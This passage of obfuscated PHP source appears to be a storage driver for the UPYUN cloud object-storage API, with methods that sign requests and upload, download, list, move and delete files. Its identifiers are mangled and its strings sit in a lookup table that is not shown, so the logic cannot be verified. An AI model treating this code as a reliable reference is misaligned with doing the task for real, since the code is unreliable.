"\150\164\164\160\72\57\x2f\166\x30\x2e\141\x70\151\56\165\x70\x79\x75\156\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÌãÅĞÖ„) { parent::__construct(); $this->_init($ÌãÅĞÖ„); } public function _init($ëƒ’Î) { $´Ò«ñÌ® =& $_SERVER[Ş­ğŠìÒ]; foreach ($ëƒ’Î as $Ä³Ì˜ => $¼äƒì) { if (isset($this->{$Ä³Ì˜})) { $this->{$Ä³Ì˜} = $¼äƒì; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($´Ò«ñÌ®[1539] . LNG($´Ò«ñÌ®[1458])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($çñ×”ù¯, $¦ÉÈÈˆ‘ = "\x47\x45\124") { $¡†‚Ç³è =& $_SERVER[Ş­ğŠìÒ]; $‡ı‚†Šº = gmdate($¡†‚Ç³è[1487]); $ ğ™Ç½ = base64_encode(hash_hmac($¡†‚Ç³è[1540], "{$¦ÉÈÈˆ‘}\46{$çñ×”ù¯}\x26{$‡ı‚†Šº}", md5("{$this->userpass}"), !0)); $åÆÃ = array("\x41\x75\x74\x68\157\x72\x69\x7a\x61\164\x69\157\x6e\x3a\125\120\131\125\x4e\40{$this->username}\x3a{$ ğ™Ç½}", "\x44\141\x74\x65\72{$‡ı‚†Šº}"); return $åÆÃ; } public function ussRequest($ÄÒİáïá, $” ‡íæ = "\x47\x45\124", $–°ñËÎ = false, $Ú”ƒŞú = false, $À¸ä—ˆØ = false) { $ïá·Üá =& $_SERVER[Ş­ğŠìÒ]; $ÄÒİáïá = trim($ÄÒİáïá, $ïá·Üá[8]); $‘Ò¿ˆ‰Î = "\57{$this->bucket}\57{$ÄÒİáïá}"; $ÆêÓš«ş = $this->ussHeaders($‘Ò¿ˆ‰Î, $” ‡íæ); if ($Ú”ƒŞú) { $ÆêÓš«ş = array_merge($ÆêÓš«ş, $Ú”ƒŞú); } $øµ¥²” = url_request($this->endpoint . $‘Ò¿ˆ‰Î, $” ‡íæ, $–°ñËÎ, $ÆêÓš«ş, $À¸ä—ˆØ); if (!$øµ¥²”) { $øÓ¿Ïç = LNG($ïá·Üá[1541]); $this->writeLog($øÓ¿Ïç); return array($ïá·Üá[1293] => !1, $ïá·Üá[1283] => $øÓ¿Ïç); } if (strtolower($” ‡íæ) == $ïá·Üá[227] || in_array($øµ¥²”[$ïá·Üá[1293]], array($ïá·Üá[274], $ïá·Üá[1542]))) { $–°ñËÎ = $øµ¥²”[$ïá·Üá[1543]]; } else { $–°ñËÎ = json_decode($øµ¥²”[$ïá·Üá[1283]], !0); if (!$–°ñËÎ) { $–°ñËÎ = $øµ¥²”[$ïá·Üá[1283]]; } else { if (!$øµ¥²”[$ïá·Üá[817]] && isset($–°ñËÎ[$ïá·Üá[1544]])) { $–°ñËÎ = $–°ñËÎ[$ïá·Üá[1544]]; } } } if (!$øµ¥²”[$ïá·Üá[817]]) { $this->writeLog($this->__errorMessage($–°ñËÎ)); } return array($ïá·Üá[1293] => $øµ¥²”[$ïá·Üá[817]], $ïá·Üá[1283] => $–°ñËÎ); } private function __errorMessage($Öı›”í) { $ô­²“¸Ì =& $_SERVER[Ş­ğŠìÒ]; if (!$Öı›”í) { return $ô­²“¸Ì[12]; } static $‚¶İ‚ë = null; if (!$‚¶İ‚ë) { $‚¶İ‚ë = I18n::getType(); } if ($‚¶İ‚ë != $ô­²“¸Ì[1497]) { return $Öı›”í; } $Îòêì¤ = array($ô­²“¸Ì[1545] => $ô­²“¸Ì[1546], $ô­²“¸Ì[1547] => $ô­²“¸Ì[1548], $ô­²“¸Ì[1549] => $ô­²“¸Ì[1548], $ô­²“¸Ì[1550] => $ô­²“¸Ì[1551], $ô­²“¸Ì[1552] => $ô­²“¸Ì[1553], $ô­²“¸Ì[1554] => $ô­²“¸Ì[1555], $ô­²“¸Ì[1556] => $ô­²“¸Ì[1557]); return isset($Îòêì¤[$Öı›”í]) ? $Îòêì¤[$Öı›”í] : $Öı›”í; } public function mkfile($Ü¾¤™ïô, $â¸Œ¯Ú = '', $÷»ÍŞæè = REPEAT_RENAME) { if ($this->setContent($Ü¾¤™ïô, $â¸Œ¯Ú)) { return $this->getPathOuter($Ü¾¤™ïô); } return !1; } public function mkdir($†ÒËí³, $Ëğ¢÷é = REPEAT_SKIP) { $¨êÜéË¾ =& $_SERVER[Ş­ğŠìÒ]; $ˆÌ¥Œ“» = trim($†ÒËí³, $¨êÜéË¾[8]); if ($this->_isFolder($ˆÌ¥Œ“»)) { return $this->getPathOuter($ˆÌ¥Œ“»); } $¯°¨ş‰Ş = array($¨êÜéË¾[1558]); $×á è½ = $this->ussRequest($ˆÌ¥Œ“», $¨êÜéË¾[257], !1, $¯°¨ş‰Ş); return $×á è½[$¨êÜéË¾[1293]] ? $this->getPathOuter($ˆÌ¥Œ“») : !1; } public function copyFile($‚Ïì§Ç€, $„´Ëíç°) { $ëÁÂÄ¸š =& $_SERVER[Ş­ğŠìÒ]; $ÉµûÊ„ı = array($ëÁÂÄ¸š[1559] . "\57{$this->bucket}\x2f{$‚Ïì§Ç€}", $ëÁÂÄ¸š[1560]); $º‘¬µÏˆ = $this->ussRequest($„´Ëíç°, $ëÁÂÄ¸š[259], !1, $ÉµûÊ„ı); return $º‘¬µÏˆ[$ëÁÂÄ¸š[1293]] ? !0 : $this->getPathOuter($„´Ëíç°); } public function moveFile($Üû¡Œ††, $á­™Ùâı) { $«‚Ş³“ú =& $_SERVER[Ş­ğŠìÒ]; $ÜÔˆ¬Öˆ = array($«‚Ş³“ú[1561] . "\57{$this->bucket}\57{$Üû¡Œ††}", $«‚Ş³“ú[1560]); $„‹¯“İ = $this->ussRequest($á­™Ùâı, $«‚Ş³“ú[259], !1, $ÜÔˆ¬Öˆ); return $„‹¯“İ[$«‚Ş³“ú[1293]] ? !0 : $this->getPathOuter($á­™Ùâı); } public function delFile($ö´¡²ËÂ) { $ñ²«­¸² =& $_SERVER[Ş­ğŠìÒ]; $î®şœØà = $this->ussRequest($ö´¡²ËÂ, $ñ²«­¸²[1562]); return $î®şœØà[$ñ²«­¸²[1293]] ? !0 : !1; } public function delFolder($¤Ø¶Ñöº) { $İ¦¥¸– =& $_SERVER[Ş­ğŠìÒ]; if (!$this->exist($¤Ø¶Ñöº)) { return !0; } $this->listItemCache = !1; $æ£·»° = $”×òÇŠ = array(); $this->fileList($¤Ø¶Ñöº, $æ£·»°, $”×òÇŠ, !0); $this->listItemCache = !0; foreach ($”×òÇŠ as $—ËØÄ¾Ò) { $³åŠà¨Ó = $this->ussRequest($—ËØÄ¾Ò[$İ¦¥¸–[32]], $İ¦¥¸–[1562]); if (!$³åŠà¨Ó[$İ¦¥¸–[1293]]) { return !1; } } foreach ($æ£·»° as $‚°·¶®Ò) { $³åŠà¨Ó = $this->ussRequest($‚°·¶®Ò, $İ¦¥¸–[1562]); if (!$³åŠà¨Ó[$İ¦¥¸–[1293]]) { return !1; } } $³åŠà¨Ó = $this->ussRequest($¤Ø¶Ñöº, $İ¦¥¸–[1562]); return $³åŠà¨Ó[$İ¦¥¸–[1293]]; } public function rename($®ó´É ¯, $Î¾¸±Õ®) { if ($this->isFile($®ó´É ¯)) { $Î¾¸±Õ® = get_path_father($®ó´É ¯) . $Î¾¸±Õ®; return $this->moveFile($®ó´É ¯, $Î¾¸±Õ®); } return $this->renameObject($®ó´É ¯, $Î¾¸±Õ®); } public function fileInfo($™ªº´‘ü, $Ú¯Ê·ƒŠ = false, $“›Åï–– = array()) { $’¸ï×ß =& $_SERVER[Ş­ğŠìÒ]; $€¬ù¼÷õ = array($’¸ï×ß[32] => $this->pathThis($™ªº´‘ü), $’¸ï×ß[87] => $this->getPathOuter($’¸ï×ß[8] . $™ªº´‘ü), $’¸ï×ß[33] => $’¸ï×ß[230], $’¸ï×ß[79] => isset($“›Åï––[$’¸ï×ß[79]]) ? $“›Åï––[$’¸ï×ß[79]] : 0, $’¸ï×ß[169] => $this->ext($™ªº´‘ü)); if ($Ú¯Ê·ƒŠ) { return $€¬ù¼÷õ; } $€¬ù¼÷õ[$’¸ï×ß[231]] = $€¬ù¼÷õ[$’¸ï×ß[88]] = 0; $€¬ù¼÷õ[$’¸ï×ß[232]] = $€¬ù¼÷õ[$’¸ï×ß[233]] = !0; if (empty($“›Åï––)) { $“›Åï–– = $this->objectMeta($™ªº´‘ü); if (!$“›Åï––) { return $€¬ù¼÷õ; } } $€¬ù¼÷õ[$’¸ï×ß[231]] = intval($“›Åï––[$’¸ï×ß[1563]]); $€¬ù¼÷õ[$’¸ï×ß[88]] = intval($“›Åï––[$’¸ï×ß[1564]]); $€¬ù¼÷õ[$’¸ï×ß[79]] = $“›Åï––[$’¸ï×ß[79]]; return $€¬ù¼÷õ; } public function folderInfo($Š¥ò‡Øç, $°è¥¤ãñ = false) { $¡ç›Æ©‚ =& $_SERVER[Ş­ğŠìÒ]; $Ã’æ»íˆ = array($¡ç›Æ©‚[32] => $this->pathThis($Š¥ò‡Øç), $¡ç›Æ©‚[87] => $this->getPathOuter($¡ç›Æ©‚[8] . $Š¥ò‡Øç), $¡ç›Æ©‚[33] => $¡ç›Æ©‚[78]); if ($°è¥¤ãñ) { return $Ã’æ»íˆ; } $Ã’æ»íˆ[$¡ç›Æ©‚[231]] = $Ã’æ»íˆ[$¡ç›Æ©‚[88]] = 0; $Ã’æ»íˆ[$¡ç›Æ©‚[232]] = $Ã’æ»íˆ[$¡ç›Æ©‚[233]] = !0; if (empty($âıêëÓ’)) { $âıêëÓ’ = $this->objectMeta($Š¥ò‡Øç); if (!$âıêëÓ’) { return $Ã’æ»íˆ; } } $Ã’æ»íˆ[$¡ç›Æ©‚[231]] = intval($âıêëÓ’[$¡ç›Æ©‚[1563]]); $Ã’æ»íˆ[$¡ç›Æ©‚[88]] = intval($âıêëÓ’[$¡ç›Æ©‚[1564]]); return $Ã’æ»íˆ; } private function listObjs($„‹ğœæÄ, $Ÿ€›Ø™Ò = 0, $¡¡ó²˜ = 1000) { $ÇÊœ–ÀÃ =& $_SERVER[Ş­ğŠìÒ]; $ÛÆõËĞ = array($ÇÊœ–ÀÃ[1565], $ÇÊœ–ÀÃ[1566] . $¡¡ó²˜); if ($Ÿ€›Ø™Ò) { $ÛÆõËĞ[] = $ÇÊœ–ÀÃ[1567] . $Ÿ€›Ø™Ò; } $î—Î×Î’ = $this->ussRequest($„‹ğœæÄ, $ÇÊœ–ÀÃ[261], !1, $ÛÆõËĞ); return !$î—Î×Î’[$ÇÊœ–ÀÃ[1293]] ? !1 : $î—Î×Î’[$ÇÊœ–ÀÃ[1283]]; } private function fileList($æ“‚…¯Û, &$ÄúÎ—æù, &$¬•Êá›, $ôù¦ÙÀ = false) { $ÁššÙ© =& $_SERVER[Ş­ğŠìÒ]; $Ø“ÂàëÉ = $ÁššÙ©[12]; $º åœ¥ = 1000; $½ŠÙÑì = rtrim($æ“‚…¯Û, $ÁššÙ©[8]) . $ÁššÙ©[8]; while (!0) { check_abort(); $î¼—ìÓŞ = $this->listObjs($æ“‚…¯Û, $Ø“ÂàëÉ, $º åœ¥); if (!$î¼—ìÓŞ) { return !1; } $Ø“ÂàëÉ = isset($î¼—ìÓŞ[$ÁššÙ©[1568]]) ? $î¼—ìÓŞ[$ÁššÙ©[1568]] : $ÁššÙ©[12]; $áÌõÜÈŠ = isset($î¼—ìÓŞ[$ÁššÙ©[1569]]) ? $î¼—ìÓŞ[$ÁššÙ©[1569]] : array(); foreach ($áÌõÜÈŠ as $Û“â¹•ä) { $¨Ê¯ÚÃ = $Û“â¹•ä[$ÁššÙ©[33]] == $ÁššÙ©[78] ? !0 : !1; $ĞÛîİĞÜ = ltrim($½ŠÙÑì . $Û“â¹•ä[$ÁššÙ©[32]], $ÁššÙ©[8]) . ($¨Ê¯ÚÃ ? $ÁššÙ©[8] : $ÁššÙ©[12]); $È‰õ¹·Ù = array($ÁššÙ©[32] => $ĞÛîİĞÜ, $ÁššÙ©[33] => $¨Ê¯ÚÃ ? $ÁššÙ©[78] : $ÁššÙ©[230], $ÁššÙ©[79] => $Û“â¹•ä[$ÁššÙ©[413]], $ÁššÙ©[1564] => $Û“â¹•ä[$ÁššÙ©[1570]]); $this->cacheMethodInfoSet($ĞÛîİĞÜ, $¨Ê¯ÚÃ, $È‰õ¹·Ù); if ($¨Ê¯ÚÃ) { $ÄúÎ—æù[] = $ĞÛîİĞÜ; if ($ôù¦ÙÀ) { $this->fileList($ĞÛîİĞÜ, $ÄúÎ—æù, $¬•Êá›, $ôù¦ÙÀ); } continue; } $¬•Êá›[] = $È‰õ¹·Ù; } if (count($áÌõÜÈŠ) < $º åœ¥) { break; } } $this->cacheMethodInfoSet($æ“‚…¯Û, !0); } public function listPath($¿ƒšÖõ´, $ˆ˜‡…† = false) { $½ìÎ«íÕ =& $_SERVER[Ş­ğŠìÒ]; $Ã¡ğ¨¯Ø = $”ÕÓ™Ã® = array(); $this->fileList($¿ƒšÖõ´, $Ã¡ğ¨¯Ø, $”ÕÓ™Ã®); foreach ($Ã¡ğ¨¯Ø as $É’´®À => $¶Š¿‹ù) { $Ã¡ğ¨¯Ø[$É’´®À] = $this->folderInfo($¶Š¿‹ù, $ˆ˜‡…†); } foreach ($”ÕÓ™Ã® as $É’´®À => $¶Š¿‹ù) { $”ÕÓ™Ã®[$É’´®À] = $this->fileInfo($¶Š¿‹ù[$½ìÎ«íÕ[32]], $ˆ˜‡…†, $¶Š¿‹ù); } return array($½ìÎ«íÕ[85] => $Ã¡ğ¨¯Ø, $½ìÎ«íÕ[86] => $”ÕÓ™Ã®); } public function has($ÁË²áÎí, $Í×¢ƒ´ = false, $‚Ùçªõ¾ = true) { $öáğäÙ‹ =& $_SERVER[Ş­ğŠìÒ]; $‡¸ø±‘» = $öáğäÙ‹[12]; $ğØ·¤» = 500; $ÙéÎñ‡© = 0; $°ñí¢ÜÖ = 0; $Õüšú®ì = rtrim($ÁË²áÎí, $öáğäÙ‹[8]) . $öáğäÙ‹[8]; while (!0) { check_abort(); $Åêæˆ‘Ú = $this->listObjs($ÁË²áÎí, $‡¸ø±‘», $ğØ·¤»); if (!$Åêæˆ‘Ú) { return !1; } $‡¸ø±‘» = isset($Åêæˆ‘Ú[$öáğäÙ‹[1568]]) ? $Åêæˆ‘Ú[$öáğäÙ‹[1568]] : $öáğäÙ‹[12]; $úØ êˆö = isset($Åêæˆ‘Ú[$öáğäÙ‹[1569]]) ? $Åêæˆ‘Ú[$öáğäÙ‹[1569]] : array(); if (empty($úØ êˆö)) { break; } $¹÷½·œê = array_filter($úØ êˆö, function ($ÖÙ£·£â) { $«×ç˜«µ =& $_SERVER[Ş­ğŠìÒ]; return $ÖÙ£·£â[$«×ç˜«µ[33]] == $«×ç˜«µ[78]; }); $›Œ¹ìÛ± = count($úØ êˆö); $¹÷½·œê = count($¹÷½·œê); $ó–ü©· = $›Œ¹ìÛ± - $¹÷½·œê; if ($Í×¢ƒ´) { $°ñí¢ÜÖ += $¹÷½·œê; $ÙéÎñ‡© += $ó–ü©·; if ($›Œ¹ìÛ± < $ğØ·¤») { break; } continue; } if ($‚Ùçªõ¾) { if ($ó–ü©·) { return !0; } } else { if ($¹÷½·œê) { return !0; } } if ($›Œ¹ìÛ± < $ğØ·¤») { break; } } if ($Í×¢ƒ´) { return array($öáğäÙ‹[239] => $ÙéÎñ‡©, $öáğäÙ‹[240] => $°ñí¢ÜÖ); } return !1; } public function listAll($ÄÈ…˜) { $Œ½•ï =& $_SERVER[Ş­ğŠìÒ]; $ú»…’ã = $ß©£‰šü = array(); $this->fileList($ÄÈ…˜, $ú»…’ã, $ß©£‰šü, !0); $û°”üı€ = array_to_keyvalue($ß©£‰šü, $Œ½•ï[32]); foreach ($ú»…’ã as $âŠÙ¿Ï) { if (is_string($âŠÙ¿Ï)) { $û°”üı€[$âŠÙ¿Ï] = array($Œ½•ï[79] => 0); } } return $this->listAllFiles($ÄÈ…˜, $û°”üı€); } public function canRead($…êëÜ–Ä) { return $this->exist($…êëÜ–Ä) ? !0 : !1; } public function canWrite($»—ã´üø) { return $this->exist($»—ã´üø) ? !0 : !1; } public function getContent($€Ãúµ÷) { return $this->fileSubstr($€Ãúµ÷, 0, -1); } public function setContent($Ö¾ºÏÄ¢, $ªÊóÒÁ• = '') { $‡Á‰Áğ¯ =& $_SERVER[Ş­ğŠìÒ]; if (!$ªÊóÒÁ•) { $ùÚÛé„ = $this->ussRequest($Ö¾ºÏÄ¢, $‡Á‰Áğ¯[257]); return $ùÚÛé„[$‡Á‰Áğ¯[1293]]; } $ƒ—šœÁ = $this->tempFile($this->pathThis($Ö¾ºÏÄ¢)); file_put_contents($ƒ—šœÁ, $ªÊóÒÁ•); if ($this->upload($Ö¾ºÏÄ¢, $ƒ—šœÁ)) { $this->tempFileRemve($ƒ—šœÁ); return !0; } return !1; } public function fileSubstr($‰Î£ã•Ã, $áÍ€õ¸¼, $°ùûôşÄ) { $û¦‘á» =& $_SERVER[Ş­ğŠìÒ]; if (!($ÒƒÚ™–Ÿ = $this->link($‰Î£ã•Ã))) { return !1; } $†ú•ß¢Ã = !1; if ($°ùûôşÄ > 0) { $ÏÓ–— = $áÍ€õ¸¼ + $°ùûôşÄ - 1; $†ú•ß¢Ã = array($û¦‘á»[1529] . $áÍ€õ¸¼ . $û¦‘á»[462] . $ÏÓ–—); } $æ™º“ = url_request($ÒƒÚ™–Ÿ, $û¦‘á»[261], !1, $†ú•ß¢Ã); return $æ™º“[$û¦‘á»[817]] ? $æ™º“[$û¦‘á»[1283]] : !1; } public function upload($úæ–µ‚, $‘ òˆ, $™¼¸·æÑ = false, $Ñ«Ÿ“ÀÌ = REPEAT_REPLACE) { $ÃÓ¼“µø =& $_SERVER[Ş­ğŠìÒ]; $û±¹Ş¤ = IO::size($‘ òˆ); if ($û±¹Ş¤ <= 1024 * 1024 * 200) { $¹¯Á¥Òô = array($ÃÓ¼“µø[1571] . $‘ òˆ); $ÕƒÇÉŸ• = $this->ussRequest($úæ–µ‚, $ÃÓ¼“µø[259], $¹¯Á¥Òô); return $ÕƒÇÉŸ•[$ÃÓ¼“µø[1293]] ? $this->getPathOuter($úæ–µ‚) : !1; } $«¶œÉ–Ó = 1024 * 1024 * 10; $˜‰¾÷Éª = array($ÃÓ¼“µø[1572], $ÃÓ¼“µø[1573] . $û±¹Ş¤, $ÃÓ¼“µø[1574], $ÃÓ¼“µø[1575] . $«¶œÉ–Ó); $ÕƒÇÉŸ• = $this->ussRequest($úæ–µ‚, $ÃÓ¼“µø[259], !1, $˜‰¾÷Éª); if (!$ÕƒÇÉŸ•[$ÃÓ¼“µø[1293]]) { return !1; } $…ÕÕŠÖ¡ = $ÕƒÇÉŸ•[$ÃÓ¼“µø[1283]]; $’Îò÷èÑ = 0; $Ó†µ€â˜ = $…ÕÕŠÖ¡[$ÃÓ¼“µø[1576]]; $èØ¹¶Á = fopen($‘ òˆ, $ÃÓ¼“µø[1452]); if (!$èØ¹¶Á) { return !1; } do { $¼§ç¢³‹ = $…ÕÕŠÖ¡[$ÃÓ¼“µø[1577]]; fseek_64($èØ¹¶Á, $’Îò÷èÑ); $À¹Í¤ÙÑ = fread($èØ¹¶Á, $¼§ç¢³‹); $«°ÎµÓ® = 0; do { $«°ÎµÓ®++; $…ÕÕŠÖ¡ = $this->uploadPart($úæ–µ‚, $…ÕÕŠÖ¡, $À¹Í¤ÙÑ); } while (!$…ÕÕŠÖ¡ && $«°ÎµÓ® < 3); if (!$…ÕÕŠÖ¡) { return !1; } $Ó†µ€â˜ = $…ÕÕŠÖ¡[$ÃÓ¼“µø[1576]]; $’Îò÷èÑ += $¼§ç¢³‹; } while ($Ó†µ€â˜ != -1); fclose($èØ¹¶Á); $˜‰¾÷Éª = array($ÃÓ¼“µø[1578], $ÃÓ¼“µø[1579] . $…ÕÕŠÖ¡[$ÃÓ¼“µø[1580]], $ÃÓ¼“µø[1574]); $ÕƒÇÉŸ• = $this->ussRequest($úæ–µ‚, $ÃÓ¼“µø[259], !1, $˜‰¾÷Éª); return $ÕƒÇÉŸ•[$ÃÓ¼“µø[1293]] ? $this->getPathOuter($Ë™²İÎä) : !1; } private function uploadPart($ÛşÎû¨¦, $ìùğâéç, &$»ŠÎúâ) { $º»Ê—» =& $_SERVER[Ş­ğŠìÒ]; $åÚÓ‚Ø„ = array($º»Ê—»[1581], $º»Ê—»[1579] . $ìùğâéç[$º»Ê—»[1580]], $º»Ê—»[1582] . $ìùğâéç[$º»Ê—»[1576]], $º»Ê—»[146] . $ìùğâéç[$º»Ê—»[1577]]); $š™ó£Ü = $this->ussRequest($ÛşÎû¨¦, $º»Ê—»[259], $»ŠÎúâ, $åÚÓ‚Ø„); return !$š™ó£Ü[$º»Ê—»[1293]] ? $š™ó£Ü[$º»Ê—»[1293]] : $š™ó£Ü[$º»Ê—»[1283]]; } public function uploadFormData($åæ†—Û¡, $ƒ·‡æ–› = 3600) { return $this->uploadPolicy($åæ†—Û¡, $ƒ·‡æ–›); } public function multiUploadFormData($¾”–ô´ô, $§œ ÊÔ¾ = 3600) { $÷ôüˆ„¯ =& $_SERVER[Ş­ğŠìÒ]; $•ÔÔƒïã = (int) $GLOBALS[$÷ôüˆ„¯[7]][$÷ôüˆ„¯[79]]; return $this->uploadPolicy($¾”–ô´ô, $§œ ÊÔ¾, $•ÔÔƒïã); } private function uploadPolicy($Ùíó–ÊÙ, $çãÂ¸Í½ = 3600, $¨ëœÊïÅ = 0) { $É¶æâÈÃ =& $_SERVER[Ş­ğŠìÒ]; $ØÈã’šƒ = $É¶æâÈÃ[8] . $this->bucket; $ÜÎÙë’ß = gmdate($É¶æâÈÃ[1487]); $Ä÷ãœş• = array($É¶æâÈÃ[1583] => $this->bucket, $É¶æâÈÃ[1584] => $Ùíó–ÊÙ, $É¶æâÈÃ[1585] => time() + $çãÂ¸Í½, $É¶æâÈÃ[1586] => $ÜÎÙë’ß); if ($¨ëœÊïÅ) { $Ä÷ãœş•[$É¶æâÈÃ[1472]] = $¨ëœÊïÅ; } $ÎÍç´› = base64_encode(json_encode($Ä÷ãœş•)); $½ò«Îù = base64_encode(hash_hmac($É¶æâÈÃ[1540], "\x50\x4f\x53\124\46{$ØÈã’šƒ}\46{$ÜÎÙë’ß}\x26{$ÎÍç´›}", md5("{$this->userpass}"), !0)); $áíã¶Ç› = array($É¶æâÈÃ[293] => $ÎÍç´›, $É¶æâÈÃ[1587] => "\125\120\131\x55\116\40{$this->username}\72{$½ò«Îù}", $É¶æâÈÃ[208] => $this->endpoint . $ØÈã’šƒ); return $áíã¶Ç›; } public function download($ É‡ûÉ, $…âëÈú¨) { $óÓúä­ = IO::getPathInner(IO::mkfile($…âëÈú¨)); if (!($‚Í¥û·Ş = $this->link($ É‡ûÉ))) { return !1; } $‡¼®õğ³ = 0; $ŒÜ¼ÃÔŞ = 1024 * 200; $Ï’ç™åü = fopen($óÓúä­, $_SERVER[Ş­ğŠìÒ][1535]); while (!0) { $Ğûá…î = $this->fileSubstr($ É‡ûÉ, $‡¼®õğ³, $ŒÜ¼ÃÔŞ); if ($Ğûá…î === !1) { return !1; } fwrite($Ï’ç™åü, $Ğûá…î); $‡¼®õğ³ += $ŒÜ¼ÃÔŞ; if (strlen($Ğûá…î) < $ŒÜ¼ÃÔŞ) { break; } } fclose($Ï’ç™åü); return $…âëÈú¨; } public function link($©ç´°å³, $ªä¨É = array()) { $ÄìşÄ¹À =& $_SERVER[Ş­ğŠìÒ]; $©ç´°å³ = trim($©ç´°å³, $ÄìşÄ¹À[8]); if (!empty($this->token)) { $šÀ€¹™´ = strtotime(date($ÄìşÄ¹À[1588])); $¨³ ¢¾ã = substr(md5($this->token . $ÄìşÄ¹À[360] . $šÀ€¹™´ . $ÄìşÄ¹À[1589] . $©ç´°å³), 12, 8) . $šÀ€¹™´; $ªä¨É[] = $ÄìşÄ¹À[1590] . $¨³ ¢¾ã; } $ÒñÅóĞ› = !empty($ªä¨É) ? $ÄìşÄ¹À[76] . implode($ÄìşÄ¹À[360], $ªä¨É) : $ÄìşÄ¹À[12]; return $this->getHost() . $ÄìşÄ¹À[8] . $©ç´°å³ . $ÒñÅóĞ›; } public function fileOut($Ïƒöˆ, $åŞĞ‰ù» = false, $ôÁĞˆä˜ = false, $ŒéãŒÄ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ïƒöˆ, $åŞĞ‰ù», $ôÁĞˆä˜, $ŒéãŒÄ); } if (!$ôÁĞˆä˜) { $ôÁĞˆä˜ = $this->pathThis($Ïƒöˆ); } $œÆÔ‹¬ò = $åŞĞ‰ù» ? array($_SERVER[Ş­ğŠìÒ][1591] . rawurlencode($ôÁĞˆä˜)) : array(); $À”“½’ = $this->link($Ïƒöˆ, $œÆÔ‹¬ò); $this->fileOutLink($À”“½’); } public function fileOutServer($ã‹Ä—Ş, $¦Œ®é— = false, $‰«§Û€ = false, $ûıæêè = '') { parent::fileOut($ã‹Ä—Ş, $¦Œ®é—, $‰«§Û€, $ûıæêè); } public function fileOutImage($ê²ÙÇç©, $€úØæÜÔ = 250) { $‡áÏÆ¿í = $this->link($ê²ÙÇç© . $_SERVER[Ş­ğŠìÒ][1592] . $€úØæÜÔ); $this->fileOutLink($‡áÏÆ¿í); } public function fileOutImageServer($«äÀİüâ, $£¤‚¿À¡ = 250) { parent::fileOutImage($«äÀİüâ, $£¤‚¿À¡); } public function hashMd5($­¸ÈÎ«ì) { $©öÄâ¬ =& $_SERVER[Ş­ğŠìÒ]; $÷ä³Œá± = $this->_objectMeta($­¸ÈÎ«ì); return isset($÷ä³Œá±[$©öÄâ¬[245]]) ? $÷ä³Œá±[$©öÄâ¬[245]] : !1; } public function size($ü–‹¯› ) { $Œ¨óÎ˜ = $this->objectMeta($ü–‹¯› ); return $Œ¨óÎ˜ ? $Œ¨óÎ˜[$_SERVER[Ş­ğŠìÒ][79]] : 0; } public function info($³ê—±®ß) { if ($this->isFolder($³ê—±®ß)) { return $this->folderInfo($³ê—±®ß); } else { if ($this->isFile($³ê—±®ß)) { return $this->fileInfo($³ê—±®ß); } } return !1; } public function exist($ÒñÖ×ä) { return $this->isFile($ÒñÖ×ä) || $this->isFolder($ÒñÖ×ä); } public function isFile($­—¹èÃí) { return !$this->isFolder($­—¹èÃí) && $this->objectMeta($­—¹èÃí); } public function isFolder($‡áâ•åğ) { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][179], $‡áâ•åğ); } protected function objectMeta($ËìÁÁ¯ì) { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][181], $ËìÁÁ¯ì); } protected function _objectMeta($¨öÇ÷¯) { $º•£àÂß =& $_SERVER[Ş­ğŠìÒ]; if ($¨öÇ÷¯ == $º•£àÂß[12] || $¨öÇ÷¯ == $º•£àÂß[8]) { return array(); } $˜ÅÒƒ™µ = $this->ussRequest($¨öÇ÷¯, $º•£àÂß[1593]); if (!$˜ÅÒƒ™µ[$º•£àÂß[1293]]) { return null; } $ã«ÃÇÙŸ = isset($˜ÅÒƒ™µ[$º•£àÂß[1283]]) ? $˜ÅÒƒ™µ[$º•£àÂß[1283]] : array(); if (!isset($ã«ÃÇÙŸ[$º•£àÂß[1594]])) { return null; } $‚É•Ëáñ = array($º•£àÂß[33] => isset($ã«ÃÇÙŸ[$º•£àÂß[1594]]) ? $ã«ÃÇÙŸ[$º•£àÂß[1594]] : null, $º•£àÂß[79] => isset($ã«ÃÇÙŸ[$º•£àÂß[1595]]) ? $ã«ÃÇÙŸ[$º•£àÂß[1595]] : null, $º•£àÂß[245] => isset($ã«ÃÇÙŸ[$º•£àÂß[1596]]) ? $ã«ÃÇÙŸ[$º•£àÂß[1596]] : null, $º•£àÂß[1563] => isset($ã«ÃÇÙŸ[$º•£àÂß[1597]]) ? $ã«ÃÇÙŸ[$º•£àÂß[1597]] : null); $‚É•Ëáñ[$º•£àÂß[1564]] = isset($ã«ÃÇÙŸ[$º•£àÂß[1598]]) ? strtotime($ã«ÃÇÙŸ[$º•£àÂß[1598]]) : $‚É•Ëáñ[$º•£àÂß[1563]]; return $‚É•Ëáñ; } protected function _isFolder($®ÁÜ‘øş) { $ÕúÀ÷à =& $_SERVER[Ş­ğŠìÒ]; if ($®ÁÜ‘øş == $ÕúÀ÷à[12] || $®ÁÜ‘øş == $ÕúÀ÷à[8]) { return !0; } $‹¾øêç£ = $this->_objectMeta($®ÁÜ‘øş); return isset($‹¾øêç£[$ÕúÀ÷à[33]]) && $‹¾øêç£[$ÕúÀ÷à[33]] == $ÕúÀ÷à[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($æö÷ÉÍ = false) { } public function exist($ÛğÜ±ˆü) { $óÄ¦Ğ = $this->info($ÛğÜ±ˆü); return $óÄ¦Ğ[$_SERVER[Ş­ğŠìÒ][232]]; } public function isFile($ï¦À“ûÏ) { $è™Ó‡Ğ = $this->info($ï¦À“ûÏ); return $è™Ó‡Ğ[$_SERVER[Ş­ğŠìÒ][232]]; } public function isFolder($ÛŒŒ£üš) { return !1; } public function size($¶©»¨ĞÇ) { $°ÊŠåå” = $this->info($¶©»¨ĞÇ); return $°ÊŠåå”[$_SERVER[Ş­ğŠìÒ][79]]; } public function info($Ìû›şÙà) { return $this->infoParse($Ìû›şÙà); } public function infoAuth($âÏ–ß¤ö) { return $this->infoParse($âÏ–ß¤ö); } public function infoWithChildren($ÈÛ¬¯Ó’) { return $this->infoParse($ÈÛ¬¯Ó’); } public function infoFull($¢«¢±íä) { return $this->infoParse($¢«¢±íä); } private function infoParse($Ô òï) { $à•®¾¥Ë =& 